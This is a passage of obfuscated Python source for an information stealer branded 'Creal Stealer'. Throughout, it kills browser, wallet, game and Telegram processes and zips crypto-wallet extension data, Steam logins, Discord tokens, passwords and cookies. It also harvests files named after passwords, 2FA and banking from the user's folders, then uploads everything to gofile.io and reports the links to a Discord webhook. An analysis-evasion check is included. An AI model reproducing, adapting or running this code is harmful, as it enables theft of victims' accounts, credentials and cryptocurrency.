                            upl05dT4k31 (O0OOO0O0OO00O0O00 ,OOOO0O00O0OO0O00O )#line:658:upl05dT4k31(t0k3nDecoded, path)
def GatherZips (O0000O0O00O0OO000 ,O00O00O0O0000O0O0 ,OO0OOO00O0OOO0OOO ):#line:660:def GatherZips(paths1, paths2, paths3):
    OO00OOO000O000O00 =[]#line:661:thttht = []
    for OOO0O00O0OOO000O0 in O0000O0O00O0OO000 :#line:662:for patt in paths1:
        OO0OO00O000O0000O =threading .Thread (target =Z1pTh1ngs ,args =[OOO0O00O0OOO000O0 [0 ],OOO0O00O0OOO000O0 [5 ],OOO0O00O0OOO000O0 [1 ]])#line:663:a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        OO0OO00O000O0000O .start ()#line:664:a.start()
        OO00OOO000O000O00 .append (OO0OO00O000O0000O )#line:665:thttht.append(a)
    for OOO0O00O0OOO000O0 in O00O00O0O0000O0O0 :#line:667:for patt in paths2:
        OO0OO00O000O0000O =threading .Thread (target =Z1pTh1ngs ,args =[OOO0O00O0OOO000O0 [0 ],OOO0O00O0OOO000O0 [2 ],OOO0O00O0OOO000O0 [1 ]])#line:668:a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        OO0OO00O000O0000O .start ()#line:669:a.start()
        OO00OOO000O000O00 .append (OO0OO00O000O0000O )#line:670:thttht.append(a)
    OO0OO00O000O0000O =threading .Thread (target =ZipTelegram ,args =[OO0OOO00O0OOO0OOO [0 ],OO0OOO00O0OOO0OOO [2 ],OO0OOO00O0OOO0OOO [1 ]])#line:672:a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    OO0OO00O000O0000O .start ()#line:673:a.start()
    OO00OOO000O000O00 .append (OO0OO00O000O0000O )#line:674:thttht.append(a)
    for OO00O0O0O0OO0O0OO in OO00OOO000O000O00 :#line:676:for thread in thttht:
        OO00O0O0O0OO0O0OO .join ()#line:677:thread.join()
    global WalletsZip ,GamingZip ,OtherZip #line:678:global WalletsZip, GamingZip, OtherZip
    OO000OOOO0OO00OOO ,OOOOO0000OO0O0O0O ,O00O0OOO0O0OOOO00 ="",'',''#line:681:wal, ga, ot = "",'',''
    if not len (WalletsZip )==0 :#line:682:if not len(WalletsZip) == 0:
        OO000OOOO0OO00OOO =":coin:  •  Wallets\n"#line:683:wal = ":coin:  •  Wallets\n"
        for OO0O0O000O000O00O in WalletsZip :#line:684:for i in WalletsZip:
            OO000OOOO0OO00OOO +=f"└─ [{OO0O0O000O000O00O[0]}]({OO0O0O000O000O00O[1]})\n"#line:685:wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len (WalletsZip )==0 :#line:686:if not len(WalletsZip) == 0:
        OOOOO0000OO0O0O0O =":video_game:  •  Gaming:\n"#line:687:ga = ":video_game:  •  Gaming:\n"
        for OO0O0O000O000O00O in GamingZip :#line:688:for i in GamingZip:
            OOOOO0000OO0O0O0O +=f"└─ [{OO0O0O000O000O00O[0]}]({OO0O0O000O000O00O[1]})\n"#line:689:ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len (OtherZip )==0 :#line:690:if not len(OtherZip) == 0:
        O00O0OOO0O0OOOO00 =":tickets:  •  Apps\n"#line:691:ot = ":tickets:  •  Apps\n"
        for OO0O0O000O000O00O in OtherZip :#line:692:for i in OtherZip:
            O00O0OOO0O0OOOO00 +=f"└─ [{OO0O0O000O000O00O[0]}]({OO0O0O000O000O00O[1]})\n"#line:693:ot += f"└─ [{i[0]}]({i[1]})\n"
    OO0O000O00O000O0O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:697:}
    O0000OOO0000O0OO0 ={"content":globalInfo (),"embeds":[{"title":"Creal Zips","description":f"{OO000OOOO0OO00OOO}\n{OOOOO0000OO0O0O0O}\n{O00O0OOO0O0OOOO00}","color":2895667 ,"footer":{"text":"Creal Stealer","icon_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"}}],"username":"Creal Stealer","avatar_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg","attachments":[]}#line:715:}
    L04durl1b (wh00k ,data =dumps (O0000OOO0000O0OO0 ).encode (),headers =OO0O000O00O000O0O )#line:716:L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
def ZipTelegram (O0O00OO0O0OO00000 ,OOO0OOO00O0OOOO0O ,OO00OOO00O0O00OO0 ):#line:719:def ZipTelegram(path, arg, procc):
    global OtherZip #line:720:global OtherZip
    O0O0OOO0000O0O0O0 =O0O00OO0O0OO00000 #line:721:pathC = path
    OOOO0000OOO0O00OO =OOO0OOO00O0OOOO0O #line:722:name = arg
    if not os .path .exists (O0O0OOO0000O0O0O0 ):return #line:723:if not os.path.exists(pathC): return
    subprocess .Popen (f"taskkill /im {OO00OOO00O0O00OO0} /t /f >nul 2>&1",shell =True )#line:724:subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    OOO00O00OOO0OO0O0 =ZipFile (f"{O0O0OOO0000O0O0O0}/{OOOO0000OOO0O00OO}.zip","w")#line:726:zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for OO0000000OO000O0O in os .listdir (O0O0OOO0000O0O0O0 ):#line:727:for file in os.listdir(pathC):
        if not ".zip"in OO0000000OO000O0O and not "tdummy"in OO0000000OO000O0O and not "user_data"in OO0000000OO000O0O and not "webview"in OO0000000OO000O0O :#line:728:if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file:
            OOO00O00OOO0OO0O0 .write (O0O0OOO0000O0O0O0 +"/"+OO0000000OO000O0O )#line:729:zf.write(pathC + "/" + file)
    OOO00O00OOO0OO0O0 .close ()#line:730:zf.close()
    OOO00OOOO0OOOOO00 =uploadToAnonfiles (f'{O0O0OOO0000O0O0O0}/{OOOO0000OOO0O00OO}.zip')#line:732:lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    os .remove (f"{O0O0OOO0000O0O0O0}/{OOOO0000OOO0O00OO}.zip")#line:734:os.remove(f"{pathC}/{name}.zip")
    OtherZip .append ([OOO0OOO00O0OOOO0O ,OOO00OOOO0OOOOO00 ])#line:735:OtherZip.append([arg, lnik])
def Z1pTh1ngs (OOO0OOO0O0OOOO0O0 ,O0OOO00O000OOOOOO ,OO0000OOOOO0000OO ):#line:737:def Z1pTh1ngs(path, arg, procc):
    OOO0OOO00O0OO0O0O =OOO0OOO0O0OOOO0O0 #line:738:pathC = path
    O00O00OO00O00O00O =O0OOO00O000OOOOOO #line:739:name = arg
    global WalletsZip ,GamingZip ,OtherZip #line:740:global WalletsZip, GamingZip, OtherZip
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in O0OOO00O000OOOOOO :#line:743:if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        OO0O0OOOO000OOO00 =OOO0OOO0O0OOOO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:744:browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        O00O00OO00O00O00O =f"Metamask_{OO0O0OOOO000OOO00}"#line:745:name = f"Metamask_{browser}"
        OOO0OOO00O0OO0O0O =OOO0OOO0O0OOOO0O0 +O0OOO00O000OOOOOO #line:746:pathC = path + arg
    if "ejbalbakoplchlghecdalmeeeajnimhm"in O0OOO00O000OOOOOO :#line:748:if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
        OO0O0OOOO000OOO00 =OOO0OOO0O0OOOO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:749:browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        O00O00OO00O00O00O =f"Metamask_Edge"#line:750:name = f"Metamask_Edge"
        OOO0OOO00O0OO0O0O =OOO0OOO0O0OOOO0O0 +O0OOO00O000OOOOOO #line:751:pathC = path + arg
    if "aholpfdialjgjfhomihkjbmgjidlcdno"in O0OOO00O000OOOOOO :#line:753:if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
        OO0O0OOOO000OOO00 =OOO0OOO0O0OOOO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:754:browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        O00O00OO00O00O00O =f"Exodus_{OO0O0OOOO000OOO00}"#line:755:name = f"Exodus_{browser}"
        OOO0OOO00O0OO0O0O =OOO0OOO0O0OOOO0O0 +O0OOO00O000OOOOOO #line:756:pathC = path + arg
    if "fhbohimaelbohpjbbldcngcnapndodjp"in O0OOO00O000OOOOOO :#line:758:if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
        OO0O0OOOO000OOO00 =OOO0OOO0O0OOOO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:759:browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        O00O00OO00O00O00O =f"Binance_{OO0O0OOOO000OOO00}"#line:760:name = f"Binance_{browser}"
        OOO0OOO00O0OO0O0O =OOO0OOO0O0OOOO0O0 +O0OOO00O000OOOOOO #line:761:pathC = path + arg
    if "hnfanknocfeofbddgcijnmhnfnkdnaad"in O0OOO00O000OOOOOO :#line:763:if "hnfanknocfeofbddgcijnmhnfnkdnaad" in arg:
        OO0O0OOOO000OOO00 =OOO0OOO0O0OOOO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:764:browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        O00O00OO00O00O00O =f"Coinbase_{OO0O0OOOO000OOO00}"#line:765:name = f"Coinbase_{browser}"
        OOO0OOO00O0OO0O0O =OOO0OOO0O0OOOO0O0 +O0OOO00O000OOOOOO #line:766:pathC = path + arg
    if "egjidjbpglichdcondbcbdnbeeppgdph"in O0OOO00O000OOOOOO :#line:768:if "egjidjbpglichdcondbcbdnbeeppgdph" in arg:
        OO0O0OOOO000OOO00 =OOO0OOO0O0OOOO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:769:browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        O00O00OO00O00O00O =f"Trust_{OO0O0OOOO000OOO00}"#line:770:name = f"Trust_{browser}"
        OOO0OOO00O0OO0O0O =OOO0OOO0O0OOOO0O0 +O0OOO00O000OOOOOO #line:771:pathC = path + arg
    if "bfnaelmomeimhlpmgjnjophhpkkoljpa"in O0OOO00O000OOOOOO :#line:773:if "bfnaelmomeimhlpmgjnjophhpkkoljpa" in arg:
        OO0O0OOOO000OOO00 =OOO0OOO0O0OOOO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:774:browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        O00O00OO00O00O00O =f"Phantom_{OO0O0OOOO000OOO00}"#line:775:name = f"Phantom_{browser}"
        OOO0OOO00O0OO0O0O =OOO0OOO0O0OOOO0O0 +O0OOO00O000OOOOOO #line:776:pathC = path + arg
    if not os .path .exists (OOO0OOO00O0OO0O0O ):return #line:779:if not os.path.exists(pathC): return
    subprocess .Popen (f"taskkill /im {OO0000OOOOO0000OO} /t /f >nul 2>&1",shell =True )#line:780:subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    if "Wallet"in O0OOO00O000OOOOOO or "NationsGlory"in O0OOO00O000OOOOOO :#line:782:if "Wallet" in arg or "NationsGlory" in arg:
        OO0O0OOOO000OOO00 =OOO0OOO0O0OOOO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:783:browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        O00O00OO00O00O00O =f"{OO0O0OOOO000OOO00}"#line:784:name = f"{browser}"
    elif "Steam"in O0OOO00O000OOOOOO :#line:786:elif "Steam" in arg:
        if not os .path .isfile (f"{OOO0OOO00O0OO0O0O}/loginusers.vdf"):return #line:787:if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        OOOO000O000OOOO0O =open (f"{OOO0OOO00O0OO0O0O}/loginusers.vdf","r+",encoding ="utf8")#line:788:f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        OO00O0OO0OO000OO0 =OOOO000O000OOOO0O .readlines ()#line:789:data = f.readlines()
        O0OO0OO00O0OOO0O0 =False #line:791:found = False
        for OO0OO0OO00OO0O00O in OO00O0OO0OO000OO0 :#line:792:for l in data:
            if 'RememberPassword"\t\t"1"'in OO0OO0OO00OO0O00O :#line:793:if 'RememberPassword"\t\t"1"' in l:
                O0OO0OO00O0OOO0O0 =True #line:794:found = True
        if O0OO0OO00O0OOO0O0 ==False :return #line:795:if found == False: return
        O00O00OO00O00O00O =O0OOO00O000OOOOOO #line:796:name = arg
    O0OOO00O000O000OO =ZipFile (f"{OOO0OOO00O0OO0O0O}/{O00O00OO00O00O00O}.zip","w")#line:799:zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for OO0OOO0OO000O0O00 in os .listdir (OOO0OOO00O0OO0O0O ):#line:800:for file in os.listdir(pathC):
        if not ".zip"in OO0OOO0OO000O0O00 :O0OOO00O000O000OO .write (OOO0OOO00O0OO0O0O +"/"+OO0OOO0OO000O0O00 )#line:801:if not ".zip" in file: zf.write(pathC + "/" + file)
    O0OOO00O000O000OO .close ()#line:802:zf.close()
    O0000OOO0O00OO0OO =uploadToAnonfiles (f'{OOO0OOO00O0OO0O0O}/{O00O00OO00O00O00O}.zip')#line:804:lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    os .remove (f"{OOO0OOO00O0OO0O0O}/{O00O00OO00O00O00O}.zip")#line:806:os.remove(f"{pathC}/{name}.zip")
    if "Wallet"in O0OOO00O000OOOOOO or "eogaeaoehlef"in O0OOO00O000OOOOOO or "koplchlghecd"in O0OOO00O000OOOOOO or "aelbohpjbbld"in O0OOO00O000OOOOOO or "nocfeofbddgc"in O0OOO00O000OOOOOO or "bpglichdcond"in O0OOO00O000OOOOOO or "momeimhlpmgj"in O0OOO00O000OOOOOO or "dialjgjfhomi"in O0OOO00O000OOOOOO :#line:808:if "Wallet" in arg or "eogaeaoehlef" in arg or "koplchlghecd" in arg or "aelbohpjbbld" in arg or "nocfeofbddgc" in arg or "bpglichdcond" in arg or "momeimhlpmgj" in arg or "dialjgjfhomi" in arg:
        WalletsZip .append ([O00O00OO00O00O00O ,O0000OOO0O00OO0OO ])#line:809:WalletsZip.append([name, lnik])
    elif "NationsGlory"in O00O00OO00O00O00O or "Steam"in O00O00OO00O00O00O or "RiotCli"in O00O00OO00O00O00O :#line:810:elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip .append ([O00O00OO00O00O00O ,O0000OOO0O00OO0OO ])#line:811:GamingZip.append([name, lnik])
    else :#line:812:else:
        OtherZip .append ([O00O00OO00O00O00O ,O0000OOO0O00OO0OO ])#line:813:OtherZip.append([name, lnik])
def GatherAll ():#line:816:def GatherAll():
    ""#line:817:'                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    O00OO0OO0O00O0000 =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:827:]
    O0OO000OO0OO0O00O =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:834:]
    O00O00OOOOO0O00O0 =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:842:]
    O0O0OOO00000OO000 =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:843:Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
    for OOOO0000OO0OOOO00 in O00OO0OO0O00O0000 :#line:845:for patt in browserPaths:
        O000O0OOOO00OO000 =threading .Thread (target =getT0k3n ,args =[OOOO0000OO0OOOO00 [0 ],OOOO0000OO0OOOO00 [2 ]])#line:846:a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        O000O0OOOO00OO000 .start ()#line:847:a.start()
        Threadlist .append (O000O0OOOO00OO000 )#line:848:Threadlist.append(a)
    for OOOO0000OO0OOOO00 in O0OO000OO0OO0O00O :#line:849:for patt in discordPaths:
        O000O0OOOO00OO000 =threading .Thread (target =G3tD1sc0rd ,args =[OOOO0000OO0OOOO00 [0 ],OOOO0000OO0OOOO00 [1 ]])#line:850:a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        O000O0OOOO00OO000 .start ()#line:851:a.start()
        Threadlist .append (O000O0OOOO00OO000 )#line:852:Threadlist.append(a)
    for OOOO0000OO0OOOO00 in O00OO0OO0O00O0000 :#line:854:for patt in browserPaths:
        O000O0OOOO00OO000 =threading .Thread (target =getP4ssw ,args =[OOOO0000OO0OOOO00 [0 ],OOOO0000OO0OOOO00 [3 ]])#line:855:a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        O000O0OOOO00OO000 .start ()#line:856:a.start()
        Threadlist .append (O000O0OOOO00OO000 )#line:857:Threadlist.append(a)
    O00O0OOOOO0000O0O =[]#line:859:ThCokk = []
    for OOOO0000OO0OOOO00 in O00OO0OO0O00O0000 :#line:860:for patt in browserPaths:
        O000O0OOOO00OO000 =threading .Thread (target =getC00k13 ,args =[OOOO0000OO0OOOO00 [0 ],OOOO0000OO0OOOO00 [4 ]])#line:861:a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        O000O0OOOO00OO000 .start ()#line:862:a.start()
        O00O0OOOOO0000O0O .append (O000O0OOOO00OO000 )#line:863:ThCokk.append(a)
    threading .Thread (target =GatherZips ,args =[O00OO0OO0O00O0000 ,O00O00OOOOO0O00O0 ,O0O0OOO00000OO000 ]).start ()#line:865:threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
    for OOOOOOOO0OOO0OO00 in O00O0OOOOO0000O0O :OOOOOOOO0OOO0OO00 .join ()#line:868:for thread in ThCokk: thread.join()
    O0O000OOOOOOO00O0 =TR6st (C00k13 )#line:869:DETECTED = TR6st(C00k13)
    if O0O000OOOOOOO00O0 ==True :return #line:870:if DETECTED == True: return
    for OOOO0000OO0OOOO00 in O00OO0OO0O00O0000 :#line:872:for patt in browserPaths:
         threading .Thread (target =Z1pTh1ngs ,args =[OOOO0000OO0OOOO00 [0 ],OOOO0000OO0OOOO00 [5 ],OOOO0000OO0OOOO00 [1 ]]).start ()#line:873:threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    for OOOO0000OO0OOOO00 in O00O00OOOOO0O00O0 :#line:875:for patt in PathsToZip:
         threading .Thread (target =Z1pTh1ngs ,args =[OOOO0000OO0OOOO00 [0 ],OOOO0000OO0OOOO00 [2 ],OOOO0000OO0OOOO00 [1 ]]).start ()#line:876:threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    threading .Thread (target =ZipTelegram ,args =[O0O0OOO00000OO000 [0 ],O0O0OOO00000OO000 [2 ],O0O0OOO00000OO000 [1 ]]).start ()#line:878:threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
    for OOOOOOOO0OOO0OO00 in Threadlist :#line:880:for thread in Threadlist:
        OOOOOOOO0OOO0OO00 .join ()#line:881:thread.join()
    global upths #line:882:global upths
    upths =[]#line:883:upths = []
    for OO0OO0O00O0OO0O00 in ["crpassw.txt","crcook.txt"]:#line:885:for file in ["crpassw.txt", "crcook.txt"]:
        upload (OO0OO0O00O0OO0O00 .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+OO0OO0O00O0OO0O00 ))#line:887:upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
def uploadToAnonfiles (O0OOO0O00O00O0O0O ):#line:889:def uploadToAnonfiles(path):
    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (O0OOO0O00O00O0O0O ,'rb')}).json ()["data"]["downloadPage"]#line:890:try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except :return False #line:891:except:return False
def KiwiFolder (OO000OOO000OOOO0O ,OOOO0OOO000OOOO0O ):#line:895:def KiwiFolder(pathF, keywords):
    global KiwiFiles #line:896:global KiwiFiles
    OO000OOO0O00O0OO0 =7 #line:897:maxfilesperdir = 7
    O0000O0O0O0O0OOOO =0 #line:898:i = 0
    O0O00O0000OOOOO0O =os .listdir (OO000OOO000OOOO0O )#line:899:listOfFile = os.listdir(pathF)
    OO0OO000O0O0O0000 =[]#line:900:ffound = []
    for OOO00OO0OO0O00O0O in O0O00O0000OOOOO0O :#line:901:for file in listOfFile:
        if not os .path .isfile (OO000OOO000OOOO0O +"/"+OOO00OO0OO0O00O0O ):return #line:902:if not os.path.isfile(pathF + "/" + file): return
        O0000O0O0O0O0OOOO +=1 #line:903:i += 1
        if O0000O0O0O0O0OOOO <=OO000OOO0O00O0OO0 :#line:904:if i <= maxfilesperdir:
            OO0OO000OO00O000O =uploadToAnonfiles (OO000OOO000OOOO0O +"/"+OOO00OO0OO0O00O0O )#line:905:url = uploadToAnonfiles(pathF + "/" + file)
            OO0OO000O0O0O0000 .append ([OO000OOO000OOOO0O +"/"+OOO00OO0OO0O00O0O ,OO0OO000OO00O000O ])#line:906:ffound.append([pathF + "/" + file, url])
        else :#line:907:else:
            break #line:908:break
    KiwiFiles .append (["folder",OO000OOO000OOOO0O +"/",OO0OO000O0O0O0000 ])#line:909:KiwiFiles.append(["folder", pathF + "/", ffound])
KiwiFiles =[]#line:911:KiwiFiles = []
def KiwiFile (O000O0O0O000OOO00 ,O00O0OO0OO00000O0 ):#line:912:def KiwiFile(path, keywords):
    global KiwiFiles #line:913:global KiwiFiles
    OO0O00OOOO000OOOO =[]#line:914:fifound = []
    O0OOOO0O0O0OOO000 =os .listdir (O000O0O0O000OOO00 )#line:915:listOfFile = os.listdir(path)
    for O0OOO00OOOO00OO0O in O0OOOO0O0O0OOO000 :#line:916:for file in listOfFile:
        for O00OOOO00O000O00O in O00O0OO0OO00000O0 :#line:917:for worf in keywords:
            if O00OOOO00O000O00O in O0OOO00OOOO00OO0O .lower ():#line:918:if worf in file.lower():
                if os .path .isfile (O000O0O0O000OOO00 +"/"+O0OOO00OOOO00OO0O )and ".txt"in O0OOO00OOOO00OO0O :#line:919:if os.path.isfile(path + "/" + file) and ".txt" in file:
                    OO0O00OOOO000OOOO .append ([O000O0O0O000OOO00 +"/"+O0OOO00OOOO00OO0O ,uploadToAnonfiles (O000O0O0O000OOO00 +"/"+O0OOO00OOOO00OO0O )])#line:920:fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break #line:921:break
                if os .path .isdir (O000O0O0O000OOO00 +"/"+O0OOO00OOOO00OO0O ):#line:922:if os.path.isdir(path + "/" + file):
                    OO00OO00000OOO0OO =O000O0O0O000OOO00 +"/"+O0OOO00OOOO00OO0O #line:923:target = path + "/" + file
                    KiwiFolder (OO00OO00000OOO0OO ,O00O0OO0OO00000O0 )#line:924:KiwiFolder(target, keywords)
                    break #line:925:break
    KiwiFiles .append (["folder",O000O0O0O000OOO00 ,OO0O00OOOO000OOOO ])#line:927:KiwiFiles.append(["folder", path, fifound])
def Kiwi ():#line:929:def Kiwi():
    OOOOOOO0O0O00OOO0 =temp .split ("\AppData")[0 ]#line:930:user = temp.split("\AppData")[0]
    O00O0O00OO0OOO0O0 =[OOOOOOO0O0O00OOO0 +"/Desktop",OOOOOOO0O0O00OOO0 +"/Downloads",OOOOOOO0O0O00OOO0 +"/Documents"]#line:935:]
    O0OO0O0OO00OO0OOO =["account","acount","passw","secret","senhas","contas","backup","2fa","importante","privado","exodus","exposed","perder","amigos","empresa","trabalho","work","private","source","users","username","login","user","usuario","log"]#line:963:]
    O0O0O0OO0O00OO0O0 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:991:]
    OOO0000OO000O0O0O =[]#line:993:wikith = []
    for OO000O00O0O00O0OO in O00O0O00OO0OOO0O0 :#line:994:for patt in path2search:
        O00000O000OO00O00 =threading .Thread (target =KiwiFile ,args =[OO000O00O0O00O0OO ,O0O0O0OO0O00OO0O0 ]);O00000O000OO00O00 .start ()#line:995:kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        OOO0000OO000O0O0O .append (O00000O000OO00O00 )#line:996:wikith.append(kiwi)
    return OOO0000OO000O0O0O #line:997:return wikith
global keyword ,cookiWords ,paswWords ,CookiCount ,P4sswCount ,WalletsZip ,GamingZip ,OtherZip #line:1000:global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:1004:]
CookiCount ,P4sswCount =0 ,0 #line:1006:CookiCount, P4sswCount = 0, 0
cookiWords =[]#line:1007:cookiWords = []
paswWords =[]#line:1008:paswWords = []
WalletsZip =[]#line:1010:WalletsZip = []
GamingZip =[]#line:1011:GamingZip = []
OtherZip =[]#line:1012:OtherZip = []
GatherAll ()#line:1014:GatherAll()
DETECTED =TR6st (C00k13 )#line:1015:DETECTED = TR6st(C00k13)
if not DETECTED :#line:1017:if not DETECTED:
    wikith =Kiwi ()#line:1018:wikith = Kiwi()
    for thread in wikith :thread .join ()#line:1020:for thread in wikith: thread.join()
    time .sleep (0.2 )#line:1021:time.sleep(0.2)
    filetext ="\n"#line:1023:filetext = "\n"
    for arg in KiwiFiles :#line:1024:for arg in KiwiFiles:
        if len (arg [2 ])!=0 :#line:1025:if len(arg[2]) != 0:
            foldpath =arg [1 ]#line:1026:foldpath = arg[1]
            foldlist =arg [2 ]#line:1027:foldlist = arg[2]
            filetext +=f"📁 {foldpath}\n"#line:1028:filetext += f"📁 {foldpath}\n"
            for ffil in foldlist :#line:1030:for ffil in foldlist:
                a =ffil [0 ].split ("/")#line:1031:a = ffil[0].split("/")
                fileanme =a [len (a )-1 ]#line:1032:fileanme = a[len(a)-1]
                b =ffil [1 ]#line:1033:b = ffil[1]
                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:1034:filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext +="\n"#line:1035:filetext += "\n"
    upload ("kiwi",filetext )